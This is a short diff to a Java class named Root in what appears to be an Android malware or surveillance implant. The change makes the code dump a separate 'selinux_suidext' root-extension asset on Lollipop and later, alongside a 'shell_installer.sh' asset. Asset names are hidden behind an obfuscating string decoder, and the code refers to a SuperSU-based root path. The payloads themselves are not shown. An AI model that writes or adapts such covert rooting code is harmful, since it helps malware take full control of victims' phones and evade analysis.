@@ -604,7 +604,11 @@ public class Root {
 		final AutoFile shellInstaller = new AutoFile(installPath, M.e("verify")); // shell_installer.sh
 
 		try {
-			Utils.dumpAsset(M.e("jb.data"), selinuxSuidext.getName());// selinux_suidext
+			if (android.os.Build.VERSION.SDK_INT > 20) {
+				Utils.dumpAsset(M.e("jbl.data"), selinuxSuidext.getName());// selinux_suidext Lollipop
+			}else {
+				Utils.dumpAsset(M.e("jb.data"), selinuxSuidext.getName());// selinux_suidext
+			}
 			Utils.dumpAsset(M.e("kb.data"), shellInstaller.getName());// shell_installer.sh
 
 			if (Cfg.DEBUG) {
@@ -655,7 +659,11 @@ public class Root {
 
 		try {
 			// selinux_suidext
-			Utils.dumpAsset(M.e("jb.data"), selinuxSuidext.getName());
+			if (android.os.Build.VERSION.SDK_INT > 20) {
+				Utils.dumpAsset(M.e("jbl.data"), selinuxSuidext.getName());// selinux_suidext Lollipop
+			}else {
+				Utils.dumpAsset(M.e("jb.data"), selinuxSuidext.getName());
+			}
 
 			if (Cfg.DEBUG) {
 				Check.asserts(selinuxSuidext.exists(), " (supersuRoot) Assert failed, not existing: " + selinuxSuidext);
